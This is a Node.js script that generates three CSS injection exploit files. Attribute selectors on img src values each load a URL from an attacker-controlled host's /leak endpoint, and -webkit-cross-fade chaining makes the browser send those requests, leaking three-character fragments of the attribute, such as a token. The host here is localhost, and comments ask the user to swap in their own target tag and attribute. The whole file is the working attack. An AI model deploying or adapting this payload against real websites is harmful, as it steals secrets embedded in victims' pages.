const fs = require('fs')
const host = 'http://localhost:3333'
const charset = 'abcdefghijklmnopqrstuvwxyz0123456789-'
const target_tag = 'img' // you have to change into your stuff
const target_attr = 'src' // you have to change into your stuff

let gadgets = [] // 사용할 문자 가젯 생성
for (let a of charset) {
    for (let b of charset) {
        for (let c of charset) {
            let str = a + b + c
            gadgets.push(str)
        }
    }
}

const third = Math.floor(gadgets.length / 3)
const [gadgets1, gadgets2, gadgets3] = [gadgets.slice(0, third), gadgets.slice(third, 2 * third), gadgets.slice(2 * third)]

function escapeCharacters(str) {
    str = str.replace(/\./g, '\\.');
    str = str.replace(/\//g, '\\/')
    return str;
}

function generatePayload(gadgets) {
    let payload = ''
    let crossPayload = 'url("/")'

    for (let str of gadgets) {
        payload += `${target_tag}[${target_attr}*="${str}"] {--${escapeCharacters(str)}: url("${host}/leak?q=${str}")}\n`
        crossPayload = `-webkit-cross-fade(${crossPayload}, var(--${escapeCharacters(str)}, none), 50%)`
    }

    return { payload, crossPayload }
}

const { payload: payload1, crossPayload: crossPayload1 } = generatePayload(gadgets1)
const { payload: payload2, crossPayload: crossPayload2 } = generatePayload(gadgets2)
const { payload: payload3, crossPayload: crossPayload3 } = generatePayload(gadgets3)

const finalPayload1 = `${payload1} img { display: block } img { background-image: ${crossPayload1}}`
const finalPayload2 = `${payload2}img:after { content: 'a'; display: block; background-image: ${crossPayload2} }`
const finalPayload3 = `${payload3}img:before { content: 'a'; display: block; background-image: ${crossPayload3} }`

fs.writeFileSync('exploit1.css', finalPayload1, 'utf-8')
fs.writeFileSync('exploit2.css', finalPayload2, 'utf-8')
fs.writeFileSync('exploit3.css', finalPayload3, 'utf-8')
